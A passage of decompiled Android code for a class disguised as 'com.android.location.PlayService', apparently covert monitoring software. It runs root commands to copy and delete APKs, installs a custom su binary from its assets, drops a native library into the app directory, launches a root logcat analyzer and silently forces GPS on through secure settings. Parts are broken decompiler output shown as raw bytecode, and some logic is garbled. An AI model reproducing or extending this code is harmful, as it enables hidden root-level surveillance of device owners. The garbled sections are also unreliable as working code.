      commandSU("cat /system/app/Shadow.apk > " + filesPath + "/root_ver");
      bool2 = bool3;
      commandSU("cat /data/app/" + MY_PACKAGE_NAME + "-1.apk > " + filesPath + "/user_ver");
      bool2 = bool3;
      Object localObject = new File(filesPath + "/root_ver");
      bool2 = bool3;
      File localFile = new File(filesPath + "/user_ver");
      bool2 = bool3;
      FLOG("fr.le=" + ((File)localObject).length());
      bool2 = bool3;
      FLOG("fu.le=" + localFile.length());
      bool2 = bool3;
      String str = commandSUresult("ls -l /data/app/ | grep " + MY_PACKAGE_NAME);
      int i = 0;
      bool2 = bool3;
      FLOG("result is = [" + str + "]");
      bool2 = bool3;
      if (str.indexOf(MY_PACKAGE_NAME) > -1)
      {
        i = 1;
        bool2 = bool3;
        FLOG("Baby, new style gonna be fun!");
      }
      bool2 = bool3;
      if (((File)localObject).length() == localFile.length())
      {
        bool2 = bool3;
        if (((File)localObject).length() > 0L) {}
      }
      else
      {
        bool2 = bool3;
        if ((((File)localObject).length() <= 0L) || (i == 0)) {
          break label489;
        }
      }
      bool2 = bool3;
      FLOG("REMOVE!!! user install due to equal size " + localObject + "<->" + localFile);
      bool2 = bool3;
      localObject = "rm -rf /data/app/" + MY_PACKAGE_NAME + "*";
      bool2 = bool3;
      FLOG((String)localObject);
      bool2 = bool3;
      commandSU((String)localObject);
      for (;;)
      {
        bool2 = bool1;
        FLOG("remove temp files");
        bool2 = bool1;
        commandSU("rm " + filesPath + "/user_ver");
        bool2 = bool1;
        commandSU("rm " + filesPath + "/root_ver");
        return bool1;
        label489:
        bool2 = bool3;
        if (((File)localObject).length() > 0L)
        {
          bool2 = bool3;
          if (localFile.length() > 0L)
          {
            bool2 = bool3;
            FLOG("skip remove due to different sotware");
            bool1 = true;
            continue;
          }
        }
        bool2 = bool3;
        if (((File)localObject).length() != 0L)
        {
          bool2 = bool3;
          if (((File)localObject).exists()) {}
        }
        else
        {
          bool2 = bool3;
          FLOG("root install not found");
          bool1 = true;
          continue;
        }
        bool2 = bool3;
        FLOG("one of files does not exists, normal");
      }
      return bool2;
    }
    catch (Exception localException) {}
  }
  
  /* Error */
  public void startLogcat()
  {
    // Byte code:
    //   0: getstatic 888	com/android/location/PlayService:ROOTED	Z
    //   3: ifne +4 -> 7
    //   6: return
    //   7: aload_0
    //   8: getfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   11: ifnull +22 -> 33
    //   14: aload_0
    //   15: getfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   18: invokevirtual 6694	com/android/location/PlayService$LogAnalyzer:stop	()V
    //   21: aload_0
    //   22: getfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   25: invokevirtual 6695	com/android/location/PlayService$LogAnalyzer:destroy	()V
    //   28: aload_0
    //   29: aconst_null
    //   30: putfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   33: aload_0
    //   34: invokevirtual 6698	com/android/location/PlayService:stopLogcat	()V
    //   37: new 864	java/lang/StringBuilder
    //   40: dup
    //   41: ldc_w 6700
    //   44: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   47: ldc_w 6702
    //   50: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   53: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   56: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   59: aconst_null
    //   60: astore_3
    //   61: aconst_null
    //   62: astore 4
    //   64: aconst_null
    //   65: astore_2
    //   66: aload 4
    //   68: astore_1
    //   69: aload_0
    //   70: invokestatic 2747	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   73: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   76: invokevirtual 2751	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   79: putfield 938	com/android/location/PlayService:logcat	Ljava/lang/Process;
    //   82: aload 4
    //   84: astore_1
    //   85: aload_0
    //   86: getfield 938	com/android/location/PlayService:logcat	Ljava/lang/Process;
    //   89: ifnonnull +25 -> 114
    //   92: aload 4
    //   94: astore_1
    //   95: ldc_w 6704
    //   98: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   101: aload_2
    //   102: astore_1
    //   103: aload_1
    //   104: ifnull -98 -> 6
    //   107: aload_1
    //   108: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   111: return
    //   112: astore_1
    //   113: return
    //   114: aload 4
    //   116: astore_1
    //   117: new 2753	java/io/OutputStreamWriter
    //   120: dup
    //   121: aload_0
    //   122: getfield 938	com/android/location/PlayService:logcat	Ljava/lang/Process;
    //   125: invokevirtual 2759	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   128: invokespecial 2762	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   131: astore_2
    //   132: aload_2
    //   133: ldc_w 6702
    //   136: invokevirtual 2763	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   139: aload_2
    //   140: invokevirtual 2766	java/io/OutputStreamWriter:flush	()V
    //   143: aload_2
    //   144: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   147: aload_0
    //   148: new 34	com/android/location/PlayService$LogAnalyzer
    //   151: dup
    //   152: aload_0
    //   153: invokespecial 6705	com/android/location/PlayService$LogAnalyzer:<init>	(Lcom/android/location/PlayService;)V
    //   156: putfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   159: aload_0
    //   160: getfield 1035	com/android/location/PlayService:thAnalyzer	Lcom/android/location/PlayService$LogAnalyzer;
    //   163: invokevirtual 6706	com/android/location/PlayService$LogAnalyzer:start	()V
    //   166: new 864	java/lang/StringBuilder
    //   169: dup
    //   170: ldc_w 6708
    //   173: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   176: aload_0
    //   177: getfield 938	com/android/location/PlayService:logcat	Ljava/lang/Process;
    //   180: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   183: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   186: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   189: aload_2
    //   190: astore_1
    //   191: goto -88 -> 103
    //   194: astore_1
    //   195: aload_3
    //   196: astore_2
    //   197: aload_1
    //   198: astore_3
    //   199: aload_2
    //   200: astore_1
    //   201: aload_3
    //   202: ldc_w 6710
    //   205: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   208: aload_2
    //   209: ifnull -203 -> 6
    //   212: aload_2
    //   213: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   216: return
    //   217: astore_1
    //   218: return
    //   219: astore_2
    //   220: aload_1
    //   221: ifnull +7 -> 228
    //   224: aload_1
    //   225: invokevirtual 2767	java/io/OutputStreamWriter:close	()V
    //   228: aload_2
    //   229: athrow
    //   230: astore_1
    //   231: goto -3 -> 228
    //   234: astore_3
    //   235: aload_2
    //   236: astore_1
    //   237: aload_3
    //   238: astore_2
    //   239: goto -19 -> 220
    //   242: astore_3
    //   243: goto -44 -> 199
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	246	0	this	PlayService
    //   68	40	1	localObject1	Object
    //   112	1	1	localIOException1	IOException
    //   116	75	1	localObject2	Object
    //   194	4	1	localException1	Exception
    //   200	1	1	localObject3	Object
    //   217	8	1	localIOException2	IOException
    //   230	1	1	localIOException3	IOException
    //   236	1	1	localObject4	Object
    //   65	148	2	localObject5	Object
    //   219	17	2	localObject6	Object
    //   238	1	2	localObject7	Object
    //   60	142	3	localObject8	Object
    //   234	4	3	localObject9	Object
    //   242	1	3	localException2	Exception
    //   62	53	4	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   107	111	112	java/io/IOException
    //   69	82	194	java/lang/Exception
    //   85	92	194	java/lang/Exception
    //   95	101	194	java/lang/Exception
    //   117	132	194	java/lang/Exception
    //   212	216	217	java/io/IOException
    //   69	82	219	finally
    //   85	92	219	finally
    //   95	101	219	finally
    //   117	132	219	finally
    //   201	208	219	finally
    //   224	228	230	java/io/IOException
    //   132	189	234	finally
    //   132	189	242	java/lang/Exception
  }
  
  public void stopLogcat()
  {
    if (this.logcat == null) {
      return;
    }
    try
    {
      this.logcat.destroy();
      this.logcat = null;
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        EXCEPT(localException, "stopLogcat");
      }
    }
  }
  
  void tryBornLamaLib()
  {
    FLOG("tryBornLamaLib");
    AssetManager localAssetManager = getAssets();
    FLOG("assetManager = " + localAssetManager);
    if (context == null)
    {
      FLOG("Lama context is null, ret");
      return;
    }
    if (localAssetManager == null) {
      try
      {
        FLOG("assetManager is null, ret");
        return;
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "tryBornLamaLib");
        return;
      }
    }
    InputStream localInputStream = localException.open("libmp3lame.so");
    FLOG("libmp3lama.so = " + localInputStream);
    if (localInputStream == null)
    {
      FLOG("No lama asset found");
      return;
    }
    FLOG("asset.lama.size=" + localInputStream.available());
    FileOutputStream localFileOutputStream = context.openFileOutput("libmp3lame.so", 0);
    byte[] arrayOfByte;
    int i;
    if (localFileOutputStream != null)
    {
      arrayOfByte = new byte['Ѐ'];
      i = localInputStream.read(arrayOfByte);
      if (i == -1) {
        localFileOutputStream.close();
      }
    }
    for (;;)
    {
      localInputStream.close();
      FLOG("Copy lama to lib");
      commandSU("cat /data/data/" + MY_PACKAGE_NAME + "/files/libmp3lame.so > /data/data/" + MY_PACKAGE_NAME + "/lib/libmp3lame.so");
      return;
      localFileOutputStream.write(arrayOfByte, 0, i);
      break;
      FLOG("cannot open out stream");
    }
  }
  
  /* Error */
  void tryCopyCustomSU()
  {
    // Byte code:
    //   0: aload_0
    //   1: invokevirtual 2047	com/android/location/PlayService:getAssets	()Landroid/content/res/AssetManager;
    //   4: astore 11
    //   6: aconst_null
    //   7: astore 6
    //   9: aconst_null
    //   10: astore 9
    //   12: aconst_null
    //   13: astore 10
    //   15: aconst_null
    //   16: astore 8
    //   18: aconst_null
    //   19: astore 7
    //   21: aload 7
    //   23: astore 5
    //   25: aload 6
    //   27: astore_3
    //   28: aload 8
    //   30: astore 4
    //   32: aload 9
    //   34: astore_2
    //   35: ldc_w 1829
    //   38: putstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   41: aload 7
    //   43: astore 5
    //   45: aload 6
    //   47: astore_3
    //   48: aload 8
    //   50: astore 4
    //   52: aload 9
    //   54: astore_2
    //   55: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   58: invokestatic 1832	com/android/location/PlayService:checkSU	(Ljava/lang/String;)Z
    //   61: ifeq +67 -> 128
    //   64: aload 7
    //   66: astore 5
    //   68: aload 6
    //   70: astore_3
    //   71: aload 8
    //   73: astore 4
    //   75: aload 9
    //   77: astore_2
    //   78: getstatic 579	com/android/location/PlayService:CAN	B
    //   81: putstatic 583	com/android/location/PlayService:bCanSu	B
    //   84: aload 7
    //   86: astore 5
    //   88: aload 6
    //   90: astore_3
    //   91: aload 8
    //   93: astore 4
    //   95: aload 9
    //   97: astore_2
    //   98: ldc_w 6734
    //   101: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   104: aload 10
    //   106: astore_2
    //   107: iconst_0
    //   108: ifeq +11 -> 119
    //   111: new 1700	java/lang/NullPointerException
    //   114: dup
    //   115: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   118: athrow
    //   119: aload_2
    //   120: ifnull +7 -> 127
    //   123: aload_2
    //   124: invokevirtual 2076	java/io/InputStream:close	()V
    //   127: return
    //   128: aload 10
    //   130: astore_2
    //   131: aload 11
    //   133: ifnull -26 -> 107
    //   136: aload 7
    //   138: astore 5
    //   140: aload 6
    //   142: astore_3
    //   143: aload 8
    //   145: astore 4
    //   147: aload 9
    //   149: astore_2
    //   150: aload 11
    //   152: ldc_w 563
    //   155: invokevirtual 2061	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   158: astore 6
    //   160: aload 6
    //   162: astore_2
    //   163: aload 6
    //   165: ifnull -58 -> 107
    //   168: aload 7
    //   170: astore 5
    //   172: aload 6
    //   174: astore_3
    //   175: aload 8
    //   177: astore 4
    //   179: aload 6
    //   181: astore_2
    //   182: new 864	java/lang/StringBuilder
    //   185: dup
    //   186: ldc_w 6736
    //   189: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   192: aload 6
    //   194: invokevirtual 2072	java/io/InputStream:available	()I
    //   197: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   200: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   203: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   206: aload 7
    //   208: astore 5
    //   210: aload 6
    //   212: astore_3
    //   213: aload 8
    //   215: astore 4
    //   217: aload 6
    //   219: astore_2
    //   220: new 1250	java/io/File
    //   223: dup
    //   224: new 864	java/lang/StringBuilder
    //   227: dup
    //   228: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   231: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   234: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   237: ldc_w 6738
    //   240: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   243: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   246: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   249: pop
    //   250: aload 7
    //   252: astore 5
    //   254: aload 6
    //   256: astore_3
    //   257: aload 8
    //   259: astore 4
    //   261: aload 6
    //   263: astore_2
    //   264: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   267: ldc_w 563
    //   270: iconst_0
    //   271: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   274: astore 7
    //   276: aload 7
    //   278: ifnull +554 -> 832
    //   281: aload 7
    //   283: astore 5
    //   285: aload 6
    //   287: astore_3
    //   288: aload 7
    //   290: astore 4
    //   292: aload 6
    //   294: astore_2
    //   295: sipush 1024
    //   298: newarray byte
    //   300: astore 8
    //   302: aload 7
    //   304: astore 5
    //   306: aload 6
    //   308: astore_3
    //   309: aload 7
    //   311: astore 4
    //   313: aload 6
    //   315: astore_2
    //   316: aload 6
    //   318: aload 8
    //   320: invokevirtual 2075	java/io/InputStream:read	([B)I
    //   323: istore_1
    //   324: iload_1
    //   325: iconst_m1
    //   326: if_icmpne +443 -> 769
    //   329: aload 7
    //   331: astore 5
    //   333: aload 6
    //   335: astore_3
    //   336: aload 7
    //   338: astore 4
    //   340: aload 6
    //   342: astore_2
    //   343: aload 7
    //   345: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   348: aload 7
    //   350: astore 5
    //   352: aload 6
    //   354: astore_3
    //   355: aload 7
    //   357: astore 4
    //   359: aload 6
    //   361: astore_2
    //   362: aload 6
    //   364: invokevirtual 2076	java/io/InputStream:close	()V
    //   367: aload 7
    //   369: astore 5
    //   371: aload 6
    //   373: astore_3
    //   374: aload 7
    //   376: astore 4
    //   378: aload 6
    //   380: astore_2
    //   381: ldc_w 563
    //   384: putstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   387: aload 7
    //   389: astore 5
    //   391: aload 6
    //   393: astore_3
    //   394: aload 7
    //   396: astore 4
    //   398: aload 6
    //   400: astore_2
    //   401: new 864	java/lang/StringBuilder
    //   404: dup
    //   405: ldc_w 4314
    //   408: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   411: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   414: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   417: ldc_w 6740
    //   420: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   423: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   426: astore 8
    //   428: aload 7
    //   430: astore 5
    //   432: aload 6
    //   434: astore_3
    //   435: aload 7
    //   437: astore 4
    //   439: aload 6
    //   441: astore_2
    //   442: new 864	java/lang/StringBuilder
    //   445: dup
    //   446: ldc_w 6742
    //   449: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   452: aload 8
    //   454: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   457: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   460: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   463: aload 7
    //   465: astore 5
    //   467: aload 6
    //   469: astore_3
    //   470: aload 7
    //   472: astore 4
    //   474: aload 6
    //   476: astore_2
    //   477: aload 8
    //   479: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   482: pop
    //   483: aload 7
    //   485: astore 5
    //   487: aload 6
    //   489: astore_3
    //   490: aload 7
    //   492: astore 4
    //   494: aload 6
    //   496: astore_2
    //   497: new 864	java/lang/StringBuilder
    //   500: dup
    //   501: ldc_w 4314
    //   504: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   507: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   510: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   513: ldc_w 6744
    //   516: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   519: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   522: astore 8
    //   524: aload 7
    //   526: astore 5
    //   528: aload 6
    //   530: astore_3
    //   531: aload 7
    //   533: astore 4
    //   535: aload 6
    //   537: astore_2
    //   538: new 864	java/lang/StringBuilder
    //   541: dup
    //   542: ldc_w 6746
    //   545: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   548: aload 8
    //   550: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   553: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   556: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   559: aload 7
    //   561: astore 5
    //   563: aload 6
    //   565: astore_3
    //   566: aload 7
    //   568: astore 4
    //   570: aload 6
    //   572: astore_2
    //   573: aload 8
    //   575: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   578: pop
    //   579: aload 7
    //   581: astore 5
    //   583: aload 6
    //   585: astore_3
    //   586: aload 7
    //   588: astore 4
    //   590: aload 6
    //   592: astore_2
    //   593: ldc_w 6748
    //   596: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   599: pop
    //   600: aload 7
    //   602: astore 5
    //   604: aload 6
    //   606: astore_3
    //   607: aload 7
    //   609: astore 4
    //   611: aload 6
    //   613: astore_2
    //   614: ldc_w 6750
    //   617: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   620: pop
    //   621: aload 7
    //   623: astore 5
    //   625: aload 6
    //   627: astore_3
    //   628: aload 7
    //   630: astore 4
    //   632: aload 6
    //   634: astore_2
    //   635: ldc_w 1829
    //   638: putstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   641: aload 7
    //   643: astore 5
    //   645: aload 6
    //   647: astore_3
    //   648: aload 7
    //   650: astore 4
    //   652: aload 6
    //   654: astore_2
    //   655: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   658: invokestatic 1832	com/android/location/PlayService:checkSU	(Ljava/lang/String;)Z
    //   661: ifeq +215 -> 876
    //   664: aload 7
    //   666: astore 5
    //   668: aload 6
    //   670: astore_3
    //   671: aload 7
    //   673: astore 4
    //   675: aload 6
    //   677: astore_2
    //   678: getstatic 579	com/android/location/PlayService:CAN	B
    //   681: putstatic 583	com/android/location/PlayService:bCanSu	B
    //   684: aload 7
    //   686: astore 5
    //   688: aload 6
    //   690: astore_3
    //   691: aload 7
    //   693: astore 4
    //   695: aload 6
    //   697: astore_2
    //   698: ldc_w 6752
    //   701: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   704: aload 7
    //   706: astore 5
    //   708: aload 6
    //   710: astore_3
    //   711: aload 7
    //   713: astore 4
    //   715: aload 6
    //   717: astore_2
    //   718: ldc_w 6754
    //   721: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   724: pop
    //   725: aload 7
    //   727: astore 5
    //   729: aload 6
    //   731: astore_3
    //   732: aload 7
    //   734: astore 4
    //   736: aload 6
    //   738: astore_2
    //   739: ldc_w 6756
    //   742: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   745: pop
    //   746: aload 7
    //   748: ifnull +8 -> 756
    //   751: aload 7
    //   753: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   756: aload 6
    //   758: ifnull -631 -> 127
    //   761: aload 6
    //   763: invokevirtual 2076	java/io/InputStream:close	()V
    //   766: return
    //   767: astore_2
    //   768: return
    //   769: aload 7
    //   771: astore 5
    //   773: aload 6
    //   775: astore_3
    //   776: aload 7
    //   778: astore 4
    //   780: aload 6
    //   782: astore_2
    //   783: aload 7
    //   785: aload 8
    //   787: iconst_0
    //   788: iload_1
    //   789: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   792: goto -490 -> 302
    //   795: astore 6
    //   797: aload 5
    //   799: astore 4
    //   801: aload_3
    //   802: astore_2
    //   803: aload 6
    //   805: ldc_w 6758
    //   808: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   811: aload 5
    //   813: ifnull +8 -> 821
    //   816: aload 5
    //   818: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   821: aload_3
    //   822: ifnull -695 -> 127
    //   825: aload_3
    //   826: invokevirtual 2076	java/io/InputStream:close	()V
    //   829: return
    //   830: astore_2
    //   831: return
    //   832: aload 7
    //   834: astore 5
    //   836: aload 6
    //   838: astore_3
    //   839: aload 7
    //   841: astore 4
    //   843: aload 6
    //   845: astore_2
    //   846: ldc_w 2088
    //   849: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   852: goto -504 -> 348
    //   855: astore_3
    //   856: aload 4
    //   858: ifnull +8 -> 866
    //   861: aload 4
    //   863: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   866: aload_2
    //   867: ifnull +7 -> 874
    //   870: aload_2
    //   871: invokevirtual 2076	java/io/InputStream:close	()V
    //   874: aload_3
    //   875: athrow
    //   876: aload 7
    //   878: astore 5
    //   880: aload 6
    //   882: astore_3
    //   883: aload 7
    //   885: astore 4
    //   887: aload 6
    //   889: astore_2
    //   890: ldc_w 6760
    //   893: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   896: aload 7
    //   898: astore 5
    //   900: aload 6
    //   902: astore_3
    //   903: aload 7
    //   905: astore 4
    //   907: aload 6
    //   909: astore_2
    //   910: ldc_w 563
    //   913: putstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   916: aload 7
    //   918: astore 5
    //   920: aload 6
    //   922: astore_3
    //   923: aload 7
    //   925: astore 4
    //   927: aload 6
    //   929: astore_2
    //   930: getstatic 565	com/android/location/PlayService:SU	Ljava/lang/String;
    //   933: invokestatic 1832	com/android/location/PlayService:checkSU	(Ljava/lang/String;)Z
    //   936: ifeq +66 -> 1002
    //   939: aload 7
    //   941: astore 5
    //   943: aload 6
    //   945: astore_3
    //   946: aload 7
    //   948: astore 4
    //   950: aload 6
    //   952: astore_2
    //   953: getstatic 579	com/android/location/PlayService:CAN	B
    //   956: putstatic 583	com/android/location/PlayService:bCanSu	B
    //   959: aload 7
    //   961: astore 5
    //   963: aload 6
    //   965: astore_3
    //   966: aload 7
    //   968: astore 4
    //   970: aload 6
    //   972: astore_2
    //   973: ldc_w 6762
    //   976: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   979: aload 7
    //   981: ifnull +8 -> 989
    //   984: aload 7
    //   986: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   989: aload 6
    //   991: ifnull -864 -> 127
    //   994: aload 6
    //   996: invokevirtual 2076	java/io/InputStream:close	()V
    //   999: return
    //   1000: astore_2
    //   1001: return
    //   1002: aload 7
    //   1004: astore 5
    //   1006: aload 6
    //   1008: astore_3
    //   1009: aload 7
    //   1011: astore 4
    //   1013: aload 6
    //   1015: astore_2
    //   1016: ldc_w 6764
    //   1019: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1022: goto -43 -> 979
    //   1025: astore_3
    //   1026: goto -907 -> 119
    //   1029: astore_2
    //   1030: return
    //   1031: astore_2
    //   1032: goto -276 -> 756
    //   1035: astore_2
    //   1036: goto -215 -> 821
    //   1039: astore 4
    //   1041: goto -175 -> 866
    //   1044: astore_2
    //   1045: goto -171 -> 874
    //   1048: astore_2
    //   1049: goto -60 -> 989
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1052	0	this	PlayService
    //   323	466	1	i	int
    //   34	705	2	localObject1	Object
    //   767	1	2	localIOException1	IOException
    //   782	21	2	localObject2	Object
    //   830	1	2	localIOException2	IOException
    //   845	128	2	localException1	Exception
    //   1000	1	2	localIOException3	IOException
    //   1015	1	2	localException2	Exception
    //   1029	1	2	localIOException4	IOException
    //   1031	1	2	localIOException5	IOException
    //   1035	1	2	localIOException6	IOException
    //   1044	1	2	localIOException7	IOException
    //   1048	1	2	localIOException8	IOException
    //   27	812	3	localObject3	Object
    //   855	20	3	localObject4	Object
    //   882	127	3	localException3	Exception
    //   1025	1	3	localIOException9	IOException
    //   30	982	4	localObject5	Object
    //   1039	1	4	localIOException10	IOException
    //   23	982	5	localFileOutputStream1	FileOutputStream
    //   7	774	6	localInputStream	InputStream
    //   795	219	6	localException4	Exception
    //   19	991	7	localFileOutputStream2	FileOutputStream
    //   16	770	8	localObject6	Object
    //   10	138	9	localObject7	Object
    //   13	116	10	localObject8	Object
    //   4	147	11	localAssetManager	AssetManager
    // Exception table:
    //   from	to	target	type
    //   761	766	767	java/io/IOException
    //   35	41	795	java/lang/Exception
    //   55	64	795	java/lang/Exception
    //   78	84	795	java/lang/Exception
    //   98	104	795	java/lang/Exception
    //   150	160	795	java/lang/Exception
    //   182	206	795	java/lang/Exception
    //   220	250	795	java/lang/Exception
    //   264	276	795	java/lang/Exception
    //   295	302	795	java/lang/Exception
    //   316	324	795	java/lang/Exception
    //   343	348	795	java/lang/Exception
    //   362	367	795	java/lang/Exception
    //   381	387	795	java/lang/Exception
    //   401	428	795	java/lang/Exception
    //   442	463	795	java/lang/Exception
    //   477	483	795	java/lang/Exception
    //   497	524	795	java/lang/Exception
    //   538	559	795	java/lang/Exception
    //   573	579	795	java/lang/Exception
    //   593	600	795	java/lang/Exception
    //   614	621	795	java/lang/Exception
    //   635	641	795	java/lang/Exception
    //   655	664	795	java/lang/Exception
    //   678	684	795	java/lang/Exception
    //   698	704	795	java/lang/Exception
    //   718	725	795	java/lang/Exception
    //   739	746	795	java/lang/Exception
    //   783	792	795	java/lang/Exception
    //   846	852	795	java/lang/Exception
    //   890	896	795	java/lang/Exception
    //   910	916	795	java/lang/Exception
    //   930	939	795	java/lang/Exception
    //   953	959	795	java/lang/Exception
    //   973	979	795	java/lang/Exception
    //   1016	1022	795	java/lang/Exception
    //   825	829	830	java/io/IOException
    //   35	41	855	finally
    //   55	64	855	finally
    //   78	84	855	finally
    //   98	104	855	finally
    //   150	160	855	finally
    //   182	206	855	finally
    //   220	250	855	finally
    //   264	276	855	finally
    //   295	302	855	finally
    //   316	324	855	finally
    //   343	348	855	finally
    //   362	367	855	finally
    //   381	387	855	finally
    //   401	428	855	finally
    //   442	463	855	finally
    //   477	483	855	finally
    //   497	524	855	finally
    //   538	559	855	finally
    //   573	579	855	finally
    //   593	600	855	finally
    //   614	621	855	finally
    //   635	641	855	finally
    //   655	664	855	finally
    //   678	684	855	finally
    //   698	704	855	finally
    //   718	725	855	finally
    //   739	746	855	finally
    //   783	792	855	finally
    //   803	811	855	finally
    //   846	852	855	finally
    //   890	896	855	finally
    //   910	916	855	finally
    //   930	939	855	finally
    //   953	959	855	finally
    //   973	979	855	finally
    //   1016	1022	855	finally
    //   994	999	1000	java/io/IOException
    //   111	119	1025	java/io/IOException
    //   123	127	1029	java/io/IOException
    //   751	756	1031	java/io/IOException
    //   816	821	1035	java/io/IOException
    //   861	866	1039	java/io/IOException
    //   870	874	1044	java/io/IOException
    //   984	989	1048	java/io/IOException
  }
  
  public void turnGpsOn(Context paramContext)
  {
    FLOG("turnGpsOn. Entry...");
    if (iForceGPS == 0)
    {
      FLOG("Don't need to force due to 0");
      return;
    }
    paramContext = "wifi,network";
    if (iForceGPS > 1)
    {
      paramContext = "gps";
      if (iForceGPS > 2) {
        paramContext = "gps" + ",wifi,network";
      }
    }
    commandSU("settings put secure location_providers_allowed " + paramContext);
